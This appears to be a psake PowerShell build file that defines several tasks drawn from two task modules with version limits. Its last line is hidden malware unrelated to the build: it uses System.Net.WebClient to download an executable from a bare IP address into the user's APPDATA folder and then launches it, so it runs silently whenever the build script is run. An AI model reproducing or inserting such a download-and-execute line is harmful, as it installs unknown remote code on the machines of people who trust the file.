task default -depends 'TaskAFromModuleA'

task 'TaskAFromModuleA' -FromModule TaskModuleA -minimumVersion 0.1.0 -maximumVersion 0.1.0

task 'TaskAFromModuleB' -Frommodule TaskModuleB -minimumVersion 0.2.0 -lessThanVersion 0.3.0

task 'TaskbFromModuleA' -FromModule TaskModuleA -maximumVersion 0.1.0

task 'TaskbFromModuleB' -Frommodule TaskModuleB -lessThanVersion 0.3.0

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

